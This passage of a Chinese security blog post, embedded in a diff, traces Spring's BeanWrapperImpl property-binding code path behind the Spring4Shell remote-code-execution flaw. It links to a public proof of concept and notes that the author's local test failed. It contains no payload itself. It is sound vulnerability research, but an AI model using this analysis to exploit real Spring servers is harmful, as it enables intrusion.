+        List&lt;PropertyValue&gt; propertyValues = pvs instanceof MutablePropertyValues ? ((MutablePropertyValues)pvs).getPropertyValueList() : Arrays.asList(pvs.getPropertyValues());//MutablePropertyValues 多个键值对?还是multi post格式?感觉后者可能性更大
+        if (ignoreUnknown) &#123;
+            this.suppressNotWritablePropertyException = true;
+        &#125;
+
+        try &#123;
+            Iterator var6 = propertyValues.iterator();
+
+            while(var6.hasNext()) &#123;
+                PropertyValue pv = (PropertyValue)var6.next();
+
+                try &#123;
+                    this.setPropertyValue(pv);//pvs遍历
+</code></pre>
+<pre><code class="java">    public void setPropertyValue(PropertyValue pv) throws BeansException &#123;
+        AbstractNestablePropertyAccessor.PropertyTokenHolder tokens = (AbstractNestablePropertyAccessor.PropertyTokenHolder)pv.resolvedTokens;
+        if (tokens == null) &#123;//null
+            String propertyName = pv.getName();
+
+            AbstractNestablePropertyAccessor nestedPa;
+            try &#123;
+                nestedPa = this.getPropertyAccessorForPropertyPath(propertyName);//属性路径解析//解析如果错误(获取不到属性)就报错退出
+            &#125; catch (NotReadablePropertyException var6) &#123;
+                throw new NotWritablePropertyException(this.getRootClass(), this.nestedPath + propertyName, &quot;Nested property in path &#39;&quot; + propertyName + &quot;&#39; does not exist&quot;, var6);
+            &#125;
+
+            tokens = this.getPropertyNameTokens(this.getFinalPath(nestedPa, propertyName));
+            if (nestedPa == this) &#123;
+                pv.getOriginalPropertyValue().resolvedTokens = tokens;
+            &#125;
+
+            nestedPa.setPropertyValue(tokens, pv);//
+        &#125; else &#123;
+            this.setPropertyValue(tokens, pv);
+        &#125;
+
+    &#125;
+</code></pre>
+<ul>
+<li>getPropertyAccessorForPropertyPath//属性路径递归解析获取属性</li>
+</ul>
+<p>BeanWrapperImpl</p>
+<pre><code class="java">    protected AbstractNestablePropertyAccessor getPropertyAccessorForPropertyPath(String propertyPath) &#123;
+        int pos = PropertyAccessorUtils.getFirstNestedPropertySeparatorIndex(propertyPath);//返回位置点号//中括号
+        if (pos &gt; -1) &#123;
+            String nestedProperty = propertyPath.substring(0, pos);
+            String nestedPath = propertyPath.substring(pos + 1);
+            AbstractNestablePropertyAccessor nestedPa = this.getNestedPropertyAccessor(nestedProperty);//getNestedPropertyAccessor
+            return nestedPa.getPropertyAccessorForPropertyPath(nestedPath);//递归
+        &#125; else &#123;
+            return this;
+        &#125;
+    &#125;
+</code></pre>
+<pre><code class="java">//getLocalPropertyHandler    private AbstractNestablePropertyAccessor getNestedPropertyAccessor(String nestedProperty) &#123;
+        if (this.nestedPropertyAccessors == null) &#123;
+            this.nestedPropertyAccessors = new HashMap();
+        &#125;
+
+        AbstractNestablePropertyAccessor.PropertyTokenHolder tokens = this.getPropertyNameTokens(nestedProperty);
+        String canonicalName = tokens.canonicalName;
+        Object value = this.getPropertyValue(tokens);...&#125;
+
+    protected Object getPropertyValue(AbstractNestablePropertyAccessor.PropertyTokenHolder tokens) throws BeansException &#123;
+        String propertyName = tokens.canonicalName;
+        String actualName = tokens.actualName;
+        AbstractNestablePropertyAccessor.PropertyHandler ph = this.getLocalPropertyHandler(actualName);//getLocalPropertyHandler
+        if (ph != null &amp;&amp; ph.isReadable()) &#123;
+            try &#123;
+                Object value = ph.getValue();//getValue
+</code></pre>
+<pre><code>    //设置 ph.pd
+    protected BeanWrapperImpl.BeanPropertyHandler getLocalPropertyHandler(String propertyName) &#123;
+        PropertyDescriptor pd = this.getCachedIntrospectionResults().getPropertyDescriptor(propertyName);
+        return pd != null ? new BeanWrapperImpl.BeanPropertyHandler(pd) : null;
+    &#125;
+        public BeanPropertyHandler(PropertyDescriptor pd) &#123;
+            super(pd.getPropertyType(), pd.getReadMethod() != null, pd.getWriteMethod() != null);
+            this.pd = pd;
+        &#125;
+</code></pre><ul>
+<li>setPropertyValue</li>
+</ul>
+<pre><code class="java">protected void setPropertyValue(AbstractNestablePropertyAccessor.PropertyTokenHolder tokens, PropertyValue pv) throws BeansException &#123;
+        if (tokens.keys != null) &#123;//null
+            this.processKeyedProperty(tokens, pv);
+        &#125; else &#123;
+            this.processLocalProperty(tokens, pv);//
+        &#125;
+    &#125;
+
+    private void processLocalProperty(AbstractNestablePropertyAccessor.PropertyTokenHolder tokens, PropertyValue pv) &#123;
+        AbstractNestablePropertyAccessor.PropertyHandler ph = this.getLocalPropertyHandler(tokens.actualName);
+        if (ph != null &amp;&amp; ph.isWritable()) &#123;
+            Object oldValue = null;
+
+            PropertyChangeEvent propertyChangeEvent;
+            try &#123;//id=1
+                Object originalValue = pv.getValue();//&quot;1&quot;
+                Object valueToApply = originalValue;//&quot;1&quot;
+                if (!Boolean.FALSE.equals(pv.conversionNecessary)) &#123;//pv.conversionNecessary=null
+                    if (pv.isConverted()) &#123;//pv.converted=false
+                        valueToApply = pv.getConvertedValue();
+                    &#125; else &#123;
+                        if (this.isExtractOldValueForEditor() &amp;&amp; ph.isReadable()) &#123;
+                            try &#123;//this.extractOldValueForEditor=true//ph.readable=true
+                                oldValue = ph.getValue();//getValue
+                            &#125;
+                        &#125;
+                        valueToApply = this.convertForProperty(tokens.canonicalName, oldValue, originalValue, ph.toTypeDescriptor());
+                    &#125;
+
+                    pv.getOriginalPropertyValue().conversionNecessary = valueToApply != originalValue;
+                &#125;
+                ph.setValue(valueToApply);//setValue
+</code></pre>
+<h6 id="BeanWrapperImpl-BeanPropertyHandler-ph-sink"><a href="#BeanWrapperImpl-BeanPropertyHandler-ph-sink" class="headerlink" title="BeanWrapperImpl$BeanPropertyHandler//ph//sink"></a>BeanWrapperImpl$BeanPropertyHandler//ph//sink</h6><ul>
+<li>getValue</li>
+</ul>
+<pre><code class="java">public Object getValue() throws Exception &#123;
+            Method readMethod = this.pd.getReadMethod();//getId()
+            if (System.getSecurityManager() != null) &#123;//null
+                ...
+            &#125; else &#123;
+                ReflectionUtils.makeAccessible(readMethod);
+                return readMethod.invoke(BeanWrapperImpl.this.getWrappedInstance(), (Object[])null);
+            &#125;
+        &#125;        
+    public final Object getWrappedInstance() &#123;
+        Assert.state(this.wrappedObject != null, &quot;No wrapped object&quot;);
+        return this.wrappedObject;//前面target-&gt;wrappedObject
+    &#125;
+</code></pre>
+<ul>
+<li>setValue</li>
+</ul>
+<pre><code class="java">        public void setValue(@Nullable Object value) throws Exception &#123;
+            Method writeMethod = this.pd instanceof GenericTypeAwarePropertyDescriptor ? ((GenericTypeAwarePropertyDescriptor)this.pd).getWriteMethodForActualAccess() : this.pd.getWriteMethod();//setId()
+            if (System.getSecurityManager() != null) &#123;
+                ...
+            &#125; else &#123;
+                ReflectionUtils.makeAccessible(writeMethod);
+                writeMethod.invoke(BeanWrapperImpl.this.getWrappedInstance(), value);
+            &#125;
+</code></pre>
+<h3 id="exp-1"><a href="#exp-1" class="headerlink" title="exp"></a>exp</h3><p><a target="_blank" rel="noopener" href="https://github.com/lunasec-io/Spring4Shell-POC">https://github.com/lunasec-io/Spring4Shell-POC</a></p>
+<p>windows tomcat启动war包//用idea启动tomcat的情况，poc失败了，没写上文件（目录问题）</p>
+<p><img src="https://raw.githubusercontent.com/pipimi110/blogimg_v1/master/img/image-20220405013736325.png" alt="image-20220405013736325"></p>
+
+        </div>
+        <!-- .entry-content -->
+        <div class="single-reward">
+          <div class="reward-open">赏
+            <div class="reward-main">
+              <ul class="reward-row">
+                <li class="alipay-code"><img src="/#"></li>
+                <li class="wechat-code"><img src="/#"></li>
+              </ul>
+            </div>
+          </div>
+        </div>
+        <div style="text-align:center; width: 100%" class="social-share share-mobile" data-disabled="diandian, tencent"></div>
+        <footer class="post-footer">
+          <div class="post-lincenses"><a href="https://creativecommons.org/licenses/by-nc-sa/4.0/deed.zh" target="_blank" rel="nofollow"><i class="fa fa-creative-commons" aria-hidden="true"></i> 知识共享署名-非商业性使用-相同方式共享 4.0 国际许可协议</a></div>
+          <div class="post-tags">
+          </div>
+          <div class="post-share">
+            <div class="social-share sharehidden share-component"></div>
+            <i class="iconfont show-share icon-forward"></i>
+          </div>
+        </footer><!-- .entry-footer -->
+      </article>
+      <!-- #post-## -->
+      <div class="toc" style="background: none;"></div>
+      <section class="post-squares nextprev">
+        
+        
+          
+            <div class="post-nepre full next">
+          
+            <a href="/2022/04/02/HttpHandler%E5%86%85%E5%AD%98%E9%A9%AC/" rel="next">
+              <div class="background">
+                <img class="lazyload" src="https://cdn.jsdelivr.net/gh/honjun/cdn@1.6/img/loader/orange.progress-bar-stripe-loader.svg" data-src="https://cdn.jsdelivr.net/gh/pipimi110/CDN@1.1/img/bg/bh3/bh3_01.png" style="width: 100%; height: 100%; object-fit: cover; pointer-events: none;" onerror="imgError(this,3)" src="https://cdn.jsdelivr.net/gh/pipimi110/CDN@1.1/img/bg/bh3/bh3_01.png">
+              </div>
+              <span class="label">
+              Next Post</span>
+              <div class="info">
+                <h3>
+                HttpHandler内存马</h3>
+                <hr>
+              </div>
+            </a>
+          </div>
+        
+      </section>
+      
+<div id="vcomments"></div>
+<script>
+  window.onload = function(){
+      var valine = new Valine();
+      valine.init({
+        el: '#vcomments',
+        appId: "GyC3NzMvd0hT9Yyd2hYIC0MN-gzGzoHsz",
+        appKey: "mgOpfzbkHYqU92CV4IDlAUHQ",
+        path: window.location.pathname,
+        placeholder: "你是我一生只会遇见一次的惊喜 ..."
+      })
+  }
+</script>
+
+      <section class="author-profile">
+        <div class="info" itemprop="author" itemscope="" itemtype="https://schema.org/Person">
+          <a href="popko.top" class="profile gravatar"><img src="https://www.popko.top/img/custom/avatar.jpg" itemprop="image" alt="popko" height="70" width="70"></a>
+          <div class="meta">
+            <span class="title">Author</span>
+            <h3 itemprop="name">
+            <a href="popko.top" itemprop="url" rel="author">popko</a>
+            </h3>
+          </div>
+        </div>
+        <hr>
+        <p><i class="iconfont icon-write"></i>otaku</p>
+      </section>
+    </main><!-- #main -->
+  </div><!-- #primary -->
+</div>
+
+
+
+    </div>    
+    <div class="ins-search">
+    <div class="ins-search-mask"></div>
+    <div class="ins-search-container">
+        <div class="ins-input-wrapper">
+            <input type="text" class="ins-search-input" placeholder="请输入关键词..."/>
+            <span class="ins-close ins-selectable"><i class="fa fa-times-circle"></i></span>
+        </div>
+        <div class="ins-section-wrapper">
+            <div class="ins-section-container"></div>
+        </div>
+    </div>
+</div>
+<script>
+(function (window) {
+    var INSIGHT_CONFIG = {
+        TRANSLATION: {
+            POSTS: '文章',
+            // PAGES: '页面',
+            CATEGORIES: '分类',
+            TAGS: '标签',
+        },
+        ROOT_URL: '/',
+        CONTENT_URL: '/content.json',
+    };
+    window.INSIGHT_CONFIG = INSIGHT_CONFIG;
+})(window);
+</script>
+    <!-- <footer id="footer">
+  
+  <div class="outer">
+    <div id="footer-info" class="inner">
+      &copy; 2022 popko<br>
+      powered_by <a href="http://hexo.io/" target="_blank">Hexo</a>
+    </div>
+  </div>
+</footer> -->
+<footer id="colophon" class="site-footer" role="contentinfo">
+  <div class="site-info">
+    <div class="footertext">
+      <div class="img-preload">
+        <img src="https://cdn.jsdelivr.net/gh/honjun/cdn@1.6/img/other/wordpress-rotating-ball-o.svg">
+        <img src="https://cdn.jsdelivr.net/gh/honjun/cdn@1.6/img/other/disqus-preloader.svg">
+      </div>
+      <p style="color: #666666;">&copy 2018</p>
+    </div>
+    <div class="footer-device">
+    <p style="font-family: 'Ubuntu', sans-serif;">
+        <span style="color: #b9b9b9;">Theme <a href="https://github.com/honjun/hexo-theme-sakura" target="_blank" style="color: #b9b9b9;;text-decoration: underline dotted rgba(0, 0, 0, .1);">Sakura</a> <i class="iconfont icon-sakura rotating" style="color: #ffc0cb;display:inline-block"></i> by <a href="https://2heng.xin/" target="_blank" style="color: #b9b9b9;;text-decoration: underline dotted rgba(0, 0, 0, .1);">Mashiro</a>&<a href="https://www.hojun.cn/" target="_blank" style="color: #b9b9b9;;text-decoration: underline dotted rgba(0, 0, 0, .1);">Hojun</a>, Powered by Hexo, Hosted by Coding Pages</a>
+        </span>
+      </p>
+    </div>
+  </div><!-- .site-info -->
+</footer>
+
+
+
+<!-- <script src="/js/tocbot.js"></script> -->
+<script type="text/javascript" src="/js/lib.min.js"></script>
+<script src="https://cdn.jsdelivr.net/npm/clipboard@2/dist/clipboard.min.js"></script>
+<script type="text/javascript" src="/js/InsightSearch.js"></script>
+<script type="text/javascript" src="/js/jquery.fancybox.min.js"></script>
+<script type="text/javascript" src="/js/zoom.min.js"></script>
+<script type="text/javascript" src="/js/sakura-app.js"></script>
+<script src="//cdn1.lncld.net/static/js/3.0.4/av-min.js"></script>
+<script src='//unpkg.com/valine@1.3.4/dist/Valine.min.js'></script>
+<script src="/js/botui.js"></script>
+<!-- 不蒜子 网页计数器 -->
+<script src="//busuanzi.ibruce.info/busuanzi/2.3/busuanzi.pure.mini.js"></script>
+<!-- <script src="https://cdnjs.cloudflare.com/ajax/libs/tocbot/4.4.2/tocbot.min.js"></script> -->
+<script type="text/javascript">
+/* <![CDATA[ */
+if (/Android|webOS|iPhone|iPod|BlackBerry/i.test(navigator.userAgent)) {
+  var Poi = {"pjax":"1","movies":{"url": "https://cdn.jsdelivr.net/gh/honjun/hojun@1.2","name":"Unbroken.mp4","live":"close"},"windowheight":"fixed","codelamp":"close","ajaxurl":"","order":"asc","formpostion":"bottom"};
+} else {
+  var Poi = {"pjax":"1","movies":{"url": "https://cdn.jsdelivr.net/gh/honjun/hojun@1.2","name":"Unbroken.mp4","live":"open"},"windowheight":"auto","codelamp":"close","ajaxurl":"","order":"asc","formpostion":"bottom"};
+}
+/* ]]> */
+
+</script>
+<script>
+$(document).ready(function() {
+  if ($(".toc").length > 0 && document.body.clientWidth > 1200) {
+    if ($(".pattern-center").length > 0) { //有图的情况
+      tocbot.init({
+          // Where to render the table of contents.
+          tocSelector: '.toc', // 放置目录的容器
+          // Where to grab the headings to build the table of contents.
+          contentSelector: '.entry-content', // 正文内容所在
+          // Which headings to grab inside of the contentSelector element.
+          scrollSmooth: true,
+          headingSelector: 'h1, h2, h3, h4, h5', // 需要索引的标题级别
+          headingsOffset: -400,
+          scrollSmoothOffset: -85
+      });
+    } else {
+      tocbot.init({
+          // Where to render the table of contents.
+          tocSelector: '.toc', // 放置目录的容器
+          // Where to grab the headings to build the table of contents.
+          contentSelector: '.entry-content', // 正文内容所在
+          // Which headings to grab inside of the contentSelector element.
+          scrollSmooth: true,
+          headingSelector: 'h1, h2, h3, h4, h5', // 需要索引的标题级别
+          headingsOffset: -85,
+          scrollSmoothOffset: -85
+      });
+    }
+    var offsetTop = $('.toc').offset().top - 95;
+    window.onscroll = function() {
+      var scrollTop = window.pageYOffset || document.documentElement.scrollTop || document.body.scrollTop;
+      if (scrollTop >= offsetTop) {
+        $('.toc').addClass('toc-fixed');
+      } else {
+        $('.toc').removeClass('toc-fixed');
+      }
+    }
+  }
+});
+</script>
+
+    <div class="openNav no-select" style="height: 50px;">
+      <div class="iconflat no-select" style="width: 50px; height: 50px;">
+        <div class="icon"></div>
+      </div>
+      <div class="site-branding search-form-submit">
+        <i class="iconfont js-toggle-search iconsearch icon-search"></i>
+      </div>
+    </div>
+  </section>
+  <div id="mo-nav" class="">
+  <div class="m-avatar">
+    <img src="/img/custom/avatar.jpg">
+  </div>
+  <p style="text-align: center; color: #333; font-weight: 900; font-family: 'Ubuntu', sans-serif; letter-spacing: 1.5px">あやねさまのpopko</p>
+  <p style="text-align: center; word-spacing: 20px;">
+    
+      
+        <a href="https://github.com/pipimi110" class="fa fa-github" target="_blank" style="color: #333; margin-left:20px"></a>
+      
+        <a href="/#" class="fa fa-weibo" target="_blank" style="color: #dd4b39; margin-left:20px"></a>
+      
+        <a href="/#" class="fa fa-qq" target="_blank" style="color: #25c6fe; margin-left:20px"></a>
+      
+    
+  </p>
+  <ul id="menu-new-1" class="menu">
+    
+      <li>
+        <a href="/">
+          <span class="faa-parent animated-hover">
+            <i class="fa  fa-fort-awesome faa-shake" aria-hidden="true"></i>
+            笔记
+          </span>
+        </a>
+        
+      </li>
+    
+  </ul>
+  <p style="text-align: center; font-size: 13px; color: #b9b9b9;">&copy 2019 hexo-sakura</p>
+</div>
+<button onclick="topFunction()" class="mobile-cd-top" id="moblieGoTop" title="Go to top" style="display: none;"><i class="fa fa-chevron-up" aria-hidden="true"></i></button>
+  <link rel="stylesheet" href="https://cdn.jsdelivr.net/npm/aplayer/dist/APlayer.min.css">
+<script src="https://cdn.jsdelivr.net/npm/aplayer/dist/APlayer.min.js"></script>
+<!-- require MetingJS -->
+<script src="https://cdn.jsdelivr.net/npm/meting@2/dist/Meting.min.js"></script>
+<style>
+  .aplayer .aplayer-lrc {
+    height: 35px;
+  }
+  .aplayer .aplayer-lrc p{
+    font-size: 16px;
+    font-weight: 700;
+    line-height: 18px !important;
+  }
+  .aplayer .aplayer-lrc p.aplayer-lrc-current{
+    color: #FF1493;
+  }
+  .aplayer.aplayer-narrow .aplayer-body{
+    left: -66px !important;
+  }
+  .aplayer.aplayer-fixed .aplayer-lrc {
+    display: none;
+  }
+  .aplayer .aplayer-lrc.aplayer-lrc-hide {
+      display:none !important;
+  }
+  .aplayer.aplayer-fixed .lrc-show {
+    display: block;
+    background: rgba(255, 255, 255, 0.8);
+  }
+</style>
+<meting-js
+
+    id="2660651585"
+
+    server="netease"
+
+    type="playlist"
+
+    fixed="true"
+
+    autoplay="false"
+
+    loop="all"
+
+    order="random"
+
+    preload="auto"
+
+    volume="0.7"
+
+    mutex="true"
+
+</meting-js>
+<script>
+  $(function(){
+    $('body').on('click', '.aplayer', function(){
+      if($('.aplayer-button').hasClass('aplayer-play')) {
+        $('.aplayer-lrc').removeClass('lrc-show');
+      } else {
+        $('.aplayer-lrc').addClass('lrc-show');
+      }
+    })
+  });
+</script>
+</body>
+</html>
